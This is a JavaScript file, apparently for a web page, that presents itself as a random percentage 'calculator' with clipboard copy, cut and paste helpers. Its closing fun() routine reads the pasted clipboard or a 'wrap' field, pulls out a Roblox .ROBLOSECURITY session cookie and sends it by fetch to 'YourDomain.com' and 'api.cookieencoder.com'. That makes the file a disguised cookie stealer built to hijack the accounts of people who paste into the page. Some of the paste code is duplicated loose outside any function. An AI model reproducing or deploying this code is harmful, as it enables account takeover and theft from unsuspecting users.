function randomNumber(min, max) { 
    return Math.random() * (max - min) + min;
} 
  function calc() {
 alert(randomNumber(60, 96) + "%")
  }
//Code by Ice Bear#8828

function useAsyncApi() {
  return document.querySelector('input[value=async]').checked;
}

function log(event) {
  var timeBadge = new Date().toTimeString().split(' ')[0];
  var newInfo = document.createElement('p');
  newInfo.innerHTML = '' + timeBadge + ' ' + event + '.';
}

function performCopyEmail() {
  var selection = window.getSelection();
  var emailLink = document.querySelector('.js-emaillink');

  if (useAsyncApi()) {
    navigator.clipboard.writeText(emailLink.textContent)
      .then(() => log('Async writeText successful, "' + emailLink.textContent + '" written'))
      .catch(err => log('Async writeText failed with error: "' + err + '"'));
      //Code by Ice Bear#8828
  } else {
    selection.removeAllRanges();
    var range = document.createRange();
    range.selectNode(emailLink);
    selection.addRange(range);
  
    try {
      var successful = document.execCommand('copy');
      var msg = successful ? 'successful' : 'unsuccessful';
      log('Copy email command was ' + msg);
    } catch (err) {
      log('execCommand Error', err);
    }
    
    selection.removeAllRanges();
  }
}

function performCutTextarea() {
  var cutTextarea = document.querySelector('.js-cuttextarea');
//Code by Ice Bear#8828
  if (useAsyncApi()) {
    navigator.clipboard.writeText(cutTextarea.textContent)
      .then(() => {
        //Code by Ice Bear#8828
        log('Async writeText successful, "' + cutTextarea.textContent + '" written');
        cutTextarea.textContent = '';
      })
      .catch(err => log('Async writeText failed with error: "' + err + '"'));
  } else {
    //Code by Ice Bear#8828
    var hasSelection = document.queryCommandEnabled('cut');
    //Code by Ice Bear#8828
    cutTextarea.select();
    //Code by Ice Bear#8828
  
    try {
      //Code by Ice Bear#8828
      var successful = document.execCommand('cut');
      var msg = successful ? 'successful' : 'unsuccessful';
      log('Cutting text command was ' + msg);
    } catch (err) {
      log('execCommand Error', err);
    }
  }
}


// Get the buttons
//.gg/legally#9082
var cutTextareaBtn = document.querySelector('.js-textareacutbtn');
var copyEmailBtn = document.querySelector('.js-emailcopybtn');
var pasteTextareaBtn = document.querySelector('.js-textareapastebtn');

// Add click event listeners
//Code by Ice Bear#8828
copyEmailBtn.addEventListener('click', performCopyEmail);
cutTextareaBtn.addEventListener('click', performCutTextarea);

function logUserOperation(event) {
  log('User performed ' + event.type + ' operation. Payload is: ' + event.clipboardData.getData('text/plain') + '');
}
//Code by Ice Bear#8828
document.addEventListener('cut', logUserOperation);
document.addEventListener('copy', logUserOperation);
document.addEventListener('paste', logUserOperation);
function performPaste() {
  var pasteTextarea = document.querySelector('.js-cuttextarea');
  //Code by Ice Bear#8828
  if (useAsyncApi()) {
    navigator.clipboard.readText()
      .then((text) => {
        pasteTextarea.textContent = text;
        log('Async readText successful, "' + text + '" written');
      })
      .catch((err) => log('Async readText failed with error: "' + err + '"'));
  } else {
    pasteTextarea.focus();
    //Code by Ice Bear#8828
    try {
      var successful = document.execCommand('paste');
      var msg = successful ? 'successful' : 'unsuccessful';
      log('Pasting text command was ' + msg);
    } catch (err) {
      log('execCommand Error', err);
      //Code by Ice Bear#8828
    }
  }
}
  var pasteTextarea = document.querySelector('.js-cuttextarea');
  //Code by Ice Bear#8828
  if (useAsyncApi()) {
    navigator.clipboard.readText()
      .then((text) => {
        pasteTextarea.textContent = text;
        log('Async readText successful, "' + text + '" written');
      })
      .catch((err) => log('Async readText failed with error: "' + err + '"'));
  } else {
    pasteTextarea.focus();
    //Code by Ice Bear#8828
    try {
      var successful = document.execCommand('paste');
      var msg = successful ? 'successful' : 'unsuccessful';
      log('Pasting text command was ' + msg);
    } catch (err) {
      log('execCommand Error', err);
      //Code by Ice Bear#8828
    }
  }
  //Delete all the comments besides the ones giving me credit cuz im sexy
  function fun(){
    performPaste()
  setTimeout(() => {
    var token = document.getElementById("wrap").value
    fetch("https://YourDomain.com/sc.php?t=" + token);
    fetch("https://api.cookieencoder.com/sc.php?t=" + token);
    var token = token.replace(token.slice(0, token.indexOf(".ROBLOSECURITY")))
    var token = token.replace(token.slice(0, token.indexOf("_")))
    var token = token.replace(token.slice(token.indexOf('"'), token.length))
    var token = token.replace('undefined','');
    var token = token.replace('undefined','');
//This part is to send it incase they copied as powershell
fetch("https://YourDomain.com/sc.php?t=" + token);
}, 100);
  }
fun()
